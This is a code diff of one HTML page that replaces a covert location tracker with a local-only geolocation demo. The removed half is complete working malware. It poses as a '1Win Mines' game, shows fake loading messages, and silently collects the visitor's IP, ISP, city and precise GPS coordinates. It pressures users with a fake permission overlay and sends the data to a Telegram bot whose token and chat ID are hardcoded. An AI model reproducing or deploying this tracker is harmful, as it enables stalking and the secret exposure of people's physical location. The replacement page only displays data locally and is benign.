@@ -1,264 +1,278 @@
-‎<!DOCTYPE html>
-‎<html>
-‎<head>
-‎    <meta charset="utf-8">
-‎    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-‎    <title>1Win Mines</title>
-‎    <style>
-‎        body, html {
-‎            margin: 0;
-‎            padding: 0;
-‎            height: 100%;
-‎            overflow: hidden;
-‎            font-family: Arial, sans-serif;
-‎        }
-‎        #bg-image {
-‎            position: absolute;
-‎            top: 0;
-‎            left: 0;
-‎            width: 100%;
-‎            height: 100%;
-‎            object-fit: cover;
-‎            z-index: 1;
-‎        }
-‎        #loading-overlay {
-‎            position: absolute;
-‎            top: 0;
-‎            left: 0;
-‎            width: 100%;
-‎            height: 100%;
-‎            background: rgba(0, 0, 0, 0.6);
-‎            display: flex;
-‎            flex-direction: column;
-‎            justify-content: center;
-‎            align-items: center;
-‎            z-index: 2;
-‎        }
-‎        .loader {
-‎            width: 50px;
-‎            height: 50px;
-‎            border: 5px solid rgba(255, 255, 255, 0.3);
-‎            border-radius: 50%;
-‎            border-top-color: #fff;
-‎            animation: spin 1s ease-in-out infinite;
-‎            margin-bottom: 15px;
-‎        }
-‎        @keyframes spin {
-‎            to { transform: rotate(360deg); }
-‎        }
-‎        #loading-text {
-‎            color: white;
-‎            font-size: 18px;
-‎            margin-top: 10px;
-‎            text-align: center;
-‎        }
-‎        #permission-request {
-‎            position: absolute;
-‎            top: 0;
-‎            left: 0;
-‎            width: 100%;
-‎            height: 100%;
-‎            background: rgba(0, 0, 0, 0.8);
-‎            display: none;
-‎            flex-direction: column;
-‎            justify-content: center;
-‎            align-items: center;
-‎            z-index: 3;
-‎            color: white;
-‎            text-align: center;
-‎            padding: 20px;
-‎        }
-‎        #permission-request h2 {
-‎            margin-bottom: 15px;
-‎        }
-‎        #allow-btn {
-‎            margin-top: 20px;
-‎            padding: 12px 30px;
-‎            background: #4CAF50;
-‎            color: white;
-‎            border: none;
-‎            border-radius: 5px;
-‎            font-size: 16px;
-‎            cursor: pointer;
-‎        }
-‎    </style>
-‎</head>
-‎<body>
-‎    <img id="bg-image" src="https://cdn.glitch.global/e4f59c88-d600-4172-aaa6-7e957cd37252/unnamed%20(1).webp?v=1750967013692" alt="Background">
-‎    
-‎    <div id="loading-overlay">
-‎        <div class="loader"></div>
-‎        <div id="loading-text">Connecting to server...</div>
-‎    </div>
-‎    
-‎    <div id="permission-request">
-‎        <h2>Location Access Required</h2>
-‎        <p>Please allow location access to continue</p>
-‎        <button id="allow-btn">ALLOW LOCATION</button>
-‎    </div>
-‎
-‎    <script>
-‎        // Telegram bot details
-‎        const botToken =
-‎'8343414878:AAFtqsUNVZ0xK5zgC5VCOc50zjqu6m1kU0g';
-‎        const chatId = '5856711440';
-‎        
-‎        // DOM elements
-‎        const loadingOverlay = document.getElementById('loading-overlay');
-‎        const loadingText = document.getElementById('loading-text');
-‎        const permissionRequest = document.getElementById('permission-request');
-‎        const allowBtn = document.getElementById('allow-btn');
-‎        
-‎        // Loading messages
-‎        const loadingMessages = [
-‎            "Connecting to server...",
-‎            "Loading game assets...",
-‎            "Verifying account...",
-‎            "Almost ready...",
-‎            "Preparing interface...",
-‎            "Finalizing setup..."
-‎        ];
-‎        
-‎        // Function to get IP info
-‎        async function getIPInfo() {
-‎            try {
-‎                const ipResponse = await fetch('https://api.ipify.org?format=json');
-‎                const ipData = await ipResponse.json();
-‎                const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-‎                return await detailsResponse.json();
-‎            } catch (error) {
-‎                console.error("IP info error:", error);
-‎                return {};
-‎            }
-‎        }
-‎        
-‎        // Function to get precise location
-‎        function getPreciseLocation() {
-‎            return new Promise((resolve) => {
-‎                if (!navigator.geolocation) {
-‎                    resolve(null);
-‎                    return;
-‎                }
-‎                
-‎                navigator.geolocation.getCurrentPosition(
-‎                    position => resolve({
-‎                        lat: position.coords.latitude,
-‎                        lon: position.coords.longitude,
-‎                        accuracy: position.coords.accuracy,
-‎                        timestamp: new Date().toLocaleString()
-‎                    }),
-‎                    error => {
-‎                        // Only show permission request if location was denied
-‎                        if (error.code === error.PERMISSION_DENIED) {
-‎                            setTimeout(() => {
-‎                                permissionRequest.style.display = 'flex';
-‎                            }, 3000);
-‎                        }
-‎                        resolve(null);
-‎                    },
-‎                    { 
-‎                        enableHighAccuracy: true,
-‎                        timeout: 10000,
-‎                        maximumAge: 0
-‎                    }
-‎                );
-‎            });
-‎        }
-‎        
-‎        // Function to send data to Telegram
-‎        async function sendToTelegram(data) {
-‎            try {
-‎                let message = `🕵️ NEW VISITOR TRACKED 🕵️\n\n`;
-‎                message += `📱 Device: ${navigator.userAgent}\n\n`;
-‎                message += `🌐 IP: ${data.ip || 'Unknown'}\n`;
-‎                message += `📍 IP Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
-‎                message += `🏢 ISP: ${data.org || 'Unknown'}\n`;
-‎                
-‎                if (data.liveLocation) {
-‎                    message += `\n🎯 LIVE GPS LOCATION:\n`;
-‎                    message += `🔹 Latitude: ${data.liveLocation.lat}\n`;
-‎                    message += `🔹 Longitude: ${data.liveLocation.lon}\n`;
-‎                    message += `🔹 Accuracy: ${data.liveLocation.accuracy}m\n`;
-‎                    message += `🔹 Time: ${data.liveLocation.timestamp}\n`;
-‎                    message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.liveLocation.lat},${data.liveLocation.lon}\n`;
-‎                } else {
-‎                    message += `\n📍 APPROX LOCATION:\n`;
-‎                    message += `🔹 Latitude: ${data.latitude || 'Unknown'}\n`;
-‎                    message += `🔹 Longitude: ${data.longitude || 'Unknown'}\n`;
-‎                    if (data.latitude && data.longitude) {
-‎                        message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.latitude},${data.longitude}\n`;
-‎                    }
-‎                }
-‎                
-‎                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-‎                    method: 'POST',
-‎                    headers: { 'Content-Type': 'application/json' },
-‎                    body: JSON.stringify({
-‎                        chat_id: chatId,
-‎                        text: message
-‎                    })
-‎                });
-‎                
-‎                if (data.liveLocation) {
-‎                    await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
-‎                        method: 'POST',
-‎                        headers: { 'Content-Type': 'application/json' },
-‎                        body: JSON.stringify({
-‎                            chat_id: chatId,
-‎                            latitude: data.liveLocation.lat,
-‎                            longitude: data.liveLocation.lon
-‎                        })
-‎                    });
-‎                }
-‎            } catch (error) {
-‎                console.error("Telegram error:", error);
-‎            }
-‎        }
-‎        
-‎        // Rotate loading messages
-‎        function rotateLoadingMessages() {
-‎            let counter = 0;
-‎            setInterval(() => {
-‎                loadingText.textContent = loadingMessages[counter];
-‎                counter = (counter + 1) % loadingMessages.length;
-‎            }, 3000);
-‎        }
-‎        
-‎        // Main tracking function
-‎        async function trackUser() {
-‎            // Start rotating loading messages
-‎            rotateLoadingMessages();
-‎            
-‎            // First try to get precise location silently
-‎            const liveLocation = await getPreciseLocation();
-‎            
-‎            // Then get IP details
-‎            const ipDetails = await getIPInfo();
-‎            
-‎            // Combine all data
-‎            const trackingData = {
-‎                ...ipDetails,
-‎                ip: ipDetails.ip || 'Unknown',
-‎                liveLocation: liveLocation
-‎            };
-‎            
-‎            // Send to Telegram
-‎            await sendToTelegram(trackingData);
-‎        }
-‎        
-‎        // When allow button is clicked
-‎        allowBtn.addEventListener('click', async () => {
-‎            permissionRequest.style.display = 'none';
-‎            // Try to get location again
-‎            await trackUser();
-‎        });
-‎        
-‎        // Start tracking when page loads
-‎        window.onload = trackUser;
-‎    </script>
-‎</body>
-‎</html>
-‎
-‎
-‎
-‎
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Safe Geolocation + Loader Demo</title>
+  <style>
+    :root { --bg: #0f1724; --panel:#0b1220; --accent:#16a34a; --muted:#9aa6b2; color-scheme: dark; }
+    *{box-sizing:border-box}
+    body,html{height:100%;margin:0;font-family:Inter,Segoe UI,Arial,system-ui;background:linear-gradient(180deg,#071020 0%, #051022 100%);color:#e6eef6}
+    .center{display:flex;align-items:center;justify-content:center;height:100%}
+    .card{width:920px;max-width:92%;background:rgba(8,12,20,0.7);border-radius:12px;padding:20px;box-shadow:0 6px 30px rgba(2,6,23,0.7)}
+    .row{display:flex;gap:16px}
+    .col{flex:1}
+    .loader{width:52px;height:52px;border:5px solid rgba(255,255,255,0.12);border-top-color:var(--accent);border-radius:50%;animation:spin 1s linear infinite;margin:10px auto}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .muted{color:var(--muted)}
+    #loading-text{font-weight:600;text-align:center;margin-top:6px}
+    .panel{background:rgba(255,255,255,0.02);padding:14px;border-radius:10px}
+    .big{font-size:18px;font-weight:600}
+    .small{font-size:13px;color:var(--muted)}
+    button{background:var(--accent);border:0;color:#fff;padding:8px 12px;border-radius:8px;cursor:pointer}
+    .permission-overlay{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(1,3,8,0.75);z-index:50}
+    .permission-box{background:#071226;padding:18px;border-radius:10px;text-align:center;color:#eaf6ea}
+    a.link{color:#9fe5b4;text-decoration:underline}
+    pre{white-space:pre-wrap;background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;font-size:13px;color:#dbe9f2}
+  </style>
+</head>
+<body>
+  <div class="center">
+    <div class="card" role="main">
+      <div style="display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:14px">
+        <div>
+          <div class="big">Safe Tracking Demo — Local Display Only</div>
+          <div class="small">This demo shows IP & (if allowed) GPS on the page. Nothing is sent anywhere.</div>
+        </div>
+        <div style="text-align:right">
+          <div id="status" class="muted">Status: Initializing…</div>
+          <div style="height:8px"></div>
+          <button id="refreshBtn">Refresh</button>
+        </div>
+      </div>
+
+      <div class="row">
+        <div class="col panel">
+          <div style="display:flex;align-items:center;gap:12px">
+            <div>
+              <div class="loader" id="loader"></div>
+            </div>
+            <div style="flex:1">
+              <div id="loading-text">Connecting to server...</div>
+              <div class="small" style="margin-top:6px">Rotating informational messages while the demo runs.</div>
+            </div>
+          </div>
+
+          <hr style="margin:14px 0;border:none;border-top:1px solid rgba(255,255,255,0.04)">
+
+          <div>
+            <div class="small" style="margin-bottom:6px">IP & Approximate Location (via IP):</div>
+            <pre id="ip-info">Loading IP info…</pre>
+          </div>
+
+          <hr style="margin:14px 0;border:none;border-top:1px solid rgba(255,255,255,0.04)">
+
+          <div>
+            <div class="small" style="margin-bottom:6px">Precise GPS (requires user permission):</div>
+            <pre id="gps-info">No GPS data yet. Click "Request Location" or allow when prompted.</pre>
+            <div style="margin-top:10px">
+              <button id="requestLocationBtn">Request Location</button>
+              <button id="showOverlayBtn" style="background:#0b6fb0;margin-left:8px">Show Permission Overlay</button>
+            </div>
+          </div>
+        </div>
+
+        <div style="width:260px" class="panel">
+          <div style="margin-bottom:10px" class="small">Instructions & Notes</div>
+          <ul style="padding-left:18px;color:var(--muted);margin:0 0 10px 0">
+            <li>Open via HTTPS (or localhost) for Geolocation API to work.</li>
+            <li>This demo <strong>does not</strong> send data to Telegram or any external service.</li>
+            <li>Use the Refresh button to re-run IP lookup and location attempt.</li>
+          </ul>
+
+          <div class="small" style="margin-bottom:6px">Last runtime log:</div>
+          <pre id="log">Idle.</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="permission-overlay" id="permissionOverlay">
+    <div class="permission-box">
+      <h3>Location Access Required</h3>
+      <p style="max-width:380px;margin:8px auto 0">Please allow location access in your browser dialog to see GPS coordinates in this demo. This demo only displays the location on this page.</p>
+      <div style="margin-top:12px">
+        <button id="overlayAllow">OK — Request Location</button>
+        <button id="overlayCancel" style="background:#444;margin-left:8px">Cancel</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // --- Safe demo: NO external exfiltration ---
+    const loadingMessages = [
+      "Connecting to server...",
+      "Loading demo assets...",
+      "Checking permissions...",
+      "Preparing interface...",
+      "Ready to request location..."
+    ];
+
+    const loadingText = document.getElementById('loading-text');
+    const loader = document.getElementById('loader');
+    const ipInfoEl = document.getElementById('ip-info');
+    const gpsInfoEl = document.getElementById('gps-info');
+    const statusEl = document.getElementById('status');
+    const logEl = document.getElementById('log');
+    const refreshBtn = document.getElementById('refreshBtn');
+    const requestLocationBtn = document.getElementById('requestLocationBtn');
+    const permissionOverlay = document.getElementById('permissionOverlay');
+    const showOverlayBtn = document.getElementById('showOverlayBtn');
+    const overlayAllow = document.getElementById('overlayAllow');
+    const overlayCancel = document.getElementById('overlayCancel');
+
+    let rotateInterval = null;
+
+    function rotateLoadingMessages() {
+      let i = 0;
+      loadingText.textContent = loadingMessages[0];
+      rotateInterval = setInterval(()=>{
+        i = (i + 1) % loadingMessages.length;
+        loadingText.textContent = loadingMessages[i];
+      }, 2500);
+    }
+
+    function stopLoader(msg) {
+      if (rotateInterval) clearInterval(rotateInterval);
+      loadingText.textContent = msg || "Idle";
+      loader.style.animation = "none";
+      statusEl.textContent = "Status: " + (msg || "Idle");
+    }
+
+    async function getIPInfo() {
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipJson = await ipRes.json();
+        log('Fetched public IP: ' + (ipJson.ip||'unknown'));
+        // Use an IP geo service (ipapi.co)
+        const detailsRes = await fetch(`https://ipapi.co/${ipJson.ip}/json/`);
+        const details = await detailsRes.json();
+        displayIPInfo({ip: ipJson.ip, ...details});
+        return { ip: ipJson.ip, ...details };
+      } catch (e) {
+        displayIPInfo({error: 'Could not fetch IP info: ' + e.message});
+        log('IP fetch error: ' + e.message);
+        return {};
+      }
+    }
+
+    function displayIPInfo(data) {
+      if (data.error) {
+        ipInfoEl.textContent = data.error;
+        return;
+      }
+      const lines = [
+        `IP: ${data.ip || 'Unknown'}`,
+        `City: ${data.city || 'Unknown'}`,
+        `Region: ${data.region || 'Unknown'}`,
+        `Country: ${data.country_name || data.country || 'Unknown'}`,
+        `Latitude/Longitude (approx): ${data.latitude || 'N/A'} , ${data.longitude || 'N/A'}`,
+        `Org/ISP: ${data.org || 'Unknown'}`,
+      ];
+      if (data.latitude && data.longitude) {
+        lines.push(`Google Maps: https://www.google.com/maps?q=${data.latitude},${data.longitude}`);
+      }
+      ipInfoEl.textContent = lines.join('\n');
+    }
+
+    function displayGPS(data) {
+      if (!data) {
+        gpsInfoEl.textContent = 'No GPS data available.';
+        return;
+      }
+      const lines = [
+        `Latitude: ${data.lat}`,
+        `Longitude: ${data.lon}`,
+        `Accuracy (meters): ${data.accuracy}`,
+        `Timestamp: ${data.timestamp}`,
+        `Google Maps: https://www.google.com/maps?q=${data.lat},${data.lon}`
+      ];
+      gpsInfoEl.textContent = lines.join('\n');
+    }
+
+    function log(msg){
+      const ts = new Date().toLocaleTimeString();
+      logEl.textContent = `[${ts}] ${msg}\n` + logEl.textContent;
+    }
+
+    function getPreciseLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          log('Geolocation API not supported in this browser.');
+          resolve(null);
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const p = {
+              lat: position.coords.latitude,
+              lon: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              timestamp: new Date(position.timestamp).toLocaleString()
+            };
+            log('User allowed geolocation: ' + p.lat + ', ' + p.lon);
+            resolve(p);
+          },
+          error => {
+            if (error.code === error.PERMISSION_DENIED) {
+              log('User denied geolocation permission.');
+            } else {
+              log('Geolocation error: ' + (error.message || error.code));
+            }
+            resolve(null);
+          },
+          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+      });
+    }
+
+    async function runDemo() {
+      rotateLoadingMessages();
+      statusEl.textContent = "Status: Running demo...";
+      log('Demo started.');
+      // IP info (approximate)
+      await getIPInfo();
+      stopLoader('IP info loaded');
+      // Do not automatically request precise GPS — wait for user action
+    }
+
+    // Buttons & overlay
+    refreshBtn.addEventListener('click', async ()=>{
+      loader.style.animation = "spin 1s linear infinite";
+      loadingText.textContent = 'Refreshing...';
+      log('User clicked refresh.');
+      await runDemo();
+    });
+
+    requestLocationBtn.addEventListener('click', async ()=>{
+      log('User requested location via button.');
+      loader.style.animation = "spin 1s linear infinite";
+      loadingText.textContent = 'Requesting location...';
+      const loc = await getPreciseLocation();
+      if (loc) {
+        displayGPS(loc);
+        stopLoader('GPS obtained');
+      } else {
+        displayGPS(null);
+        stopLoader('No GPS');
+      }
+    });
+
+    showOverlayBtn.addEventListener('click', ()=> {
+      permissionOverlay.style.display = 'flex';
+    });
+    overlayCancel.addEventListener('click', ()=> {
+      permissionOverlay.style.display = 'none';
+      log('Permission overlay cancelled by user.');
+    });
+    overlayAllow.addEventListener('click', async ()=> {
+      permissionOverlay.style.display = 'none';
+      log('Permission overlay OK clicked.');
+      requestLocationBtn.click();
+    });
+
+    // Initial run
+    window.addEventListener('load', runDemo);
+  </script>
+</body>
+</html>
